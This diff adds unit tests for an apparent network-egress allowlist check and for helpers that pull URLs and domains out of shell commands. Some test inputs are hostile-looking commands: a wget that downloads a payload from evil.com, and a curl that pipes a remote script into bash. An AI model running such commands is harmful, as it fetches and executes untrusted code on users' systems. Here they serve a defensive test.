@@ -6,6 +6,8 @@ import {
   CREDENTIAL_PATH_PATTERNS,
   CREDENTIAL_BASENAME_PATTERNS,
   isCredentialPath,
+  extractDomain,
+  extractUrlFromCommand,
 } from '../../src/invariants/definitions.js';
 import type { SystemState } from '../../src/invariants/definitions.js';
 import { checkAllInvariants, buildSystemState } from '../../src/invariants/checker.js';
@@ -861,6 +863,209 @@ describe('buildSystemState', () => {
       modifiedFiles: ['a.ts', 'b.ts', 'c.ts'],
     });
     expect(state.filesAffected).toBe(3);
+  });
+
+  it('populates network fields from context', () => {
+    const state = buildSystemState({
+      isNetworkRequest: true,
+      requestUrl: 'https://api.example.com/data',
+      requestDomain: 'api.example.com',
+      networkAllowlist: ['example.com'],
+    });
+    expect(state.isNetworkRequest).toBe(true);
+    expect(state.requestUrl).toBe('https://api.example.com/data');
+    expect(state.requestDomain).toBe('api.example.com');
+    expect(state.networkAllowlist).toEqual(['example.com']);
+  });
+
+  it('defaults network fields when not specified', () => {
+    const state = buildSystemState({});
+    expect(state.isNetworkRequest).toBe(false);
+    expect(state.requestUrl).toBe('');
+    expect(state.requestDomain).toBe('');
+    expect(state.networkAllowlist).toEqual([]);
+  });
+});
+
+describe('extractDomain', () => {
+  it('extracts domain from https URL', () => {
+    expect(extractDomain('https://api.example.com/data')).toBe('api.example.com');
+  });
+
+  it('extracts domain from http URL', () => {
+    expect(extractDomain('http://evil.com/payload')).toBe('evil.com');
+  });
+
+  it('extracts domain with port', () => {
+    expect(extractDomain('https://localhost:3000/api')).toBe('localhost');
+  });
+
+  it('returns null for invalid URLs', () => {
+    expect(extractDomain('not-a-url')).toBeNull();
+    expect(extractDomain('')).toBeNull();
+  });
+});
+
+describe('extractUrlFromCommand', () => {
+  it('extracts URL from curl command', () => {
+    expect(extractUrlFromCommand('curl https://api.example.com/data')).toBe(
+      'https://api.example.com/data'
+    );
+  });
+
+  it('extracts URL from wget command', () => {
+    expect(extractUrlFromCommand('wget http://evil.com/payload.sh')).toBe(
+      'http://evil.com/payload.sh'
+    );
+  });
+
+  it('extracts URL from curl with flags', () => {
+    expect(extractUrlFromCommand('curl -sL https://get.rvm.io | bash')).toBe('https://get.rvm.io');
+  });
+
+  it('extracts URL from complex curl command', () => {
+    const url = extractUrlFromCommand('curl -X POST https://api.github.com/repos -H "Auth: token"');
+    expect(url).toBe('https://api.github.com/repos');
+  });
+
+  it('returns null for commands without URLs', () => {
+    expect(extractUrlFromCommand('npm install')).toBeNull();
+    expect(extractUrlFromCommand('')).toBeNull();
+  });
+
+  it('returns null for null/undefined input', () => {
+    expect(extractUrlFromCommand(null as unknown as string)).toBeNull();
+  });
+});
+
+describe('network-egress-governance', () => {
+  const inv = findInvariant('network-egress-governance');
+
+  it('has severity 4', () => {
+    expect(inv.severity).toBe(4);
+  });
+
+  it('holds when action is not a network request', () => {
+    const result = inv.check({ isNetworkRequest: false });
+    expect(result.holds).toBe(true);
+  });
+
+  it('holds when isNetworkRequest is undefined', () => {
+    const result = inv.check({});
+    expect(result.holds).toBe(true);
+  });
+
+  it('holds when no allowlist is configured (fail-open)', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'any-domain.com',
+    });
+    expect(result.holds).toBe(true);
+    expect(result.actual).toContain('fail-open');
+  });
+
+  it('holds when allowlist is empty (fail-open)', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'any-domain.com',
+      networkAllowlist: [],
+    });
+    expect(result.holds).toBe(true);
+  });
+
+  it('holds when domain is in allowlist', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'api.example.com',
+      networkAllowlist: ['api.example.com'],
+    });
+    expect(result.holds).toBe(true);
+    expect(result.actual).toContain('allowlisted');
+  });
+
+  it('holds when domain is a subdomain of allowlisted domain', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'api.example.com',
+      networkAllowlist: ['example.com'],
+    });
+    expect(result.holds).toBe(true);
+  });
+
+  it('fails when domain is not in allowlist', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'evil.com',
+      networkAllowlist: ['example.com', 'github.com'],
+    });
+    expect(result.holds).toBe(false);
+    expect(result.actual).toContain('evil.com');
+    expect(result.actual).toContain('not in the allowlist');
+  });
+
+  it('fails when no domain could be extracted', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: '',
+      networkAllowlist: ['example.com'],
+    });
+    expect(result.holds).toBe(false);
+    expect(result.actual).toContain('No domain could be extracted');
+  });
+
+  it('performs case-insensitive domain matching', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'API.Example.COM',
+      networkAllowlist: ['example.com'],
+    });
+    expect(result.holds).toBe(true);
+  });
+
+  it('does not match partial domain names', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'notexample.com',
+      networkAllowlist: ['example.com'],
+    });
+    expect(result.holds).toBe(false);
+  });
+
+  it('matches exact domain even without subdomain', () => {
+    const result = inv.check({
+      isNetworkRequest: true,
+      requestDomain: 'github.com',
+      networkAllowlist: ['github.com'],
+    });
+    expect(result.holds).toBe(true);
+  });
+
+  it('supports multiple domains in allowlist', () => {
+    const allowlist = ['github.com', 'npmjs.org', 'example.com'];
+
+    expect(
+      inv.check({
+        isNetworkRequest: true,
+        requestDomain: 'api.github.com',
+        networkAllowlist: allowlist,
+      }).holds
+    ).toBe(true);
+
+    expect(
+      inv.check({
+        isNetworkRequest: true,
+        requestDomain: 'registry.npmjs.org',
+        networkAllowlist: allowlist,
+      }).holds
+    ).toBe(true);
+
+    expect(
+      inv.check({
+        isNetworkRequest: true,
+        requestDomain: 'evil.io',
+        networkAllowlist: allowlist,
+      }).holds
+    ).toBe(false);
   });
 });
 
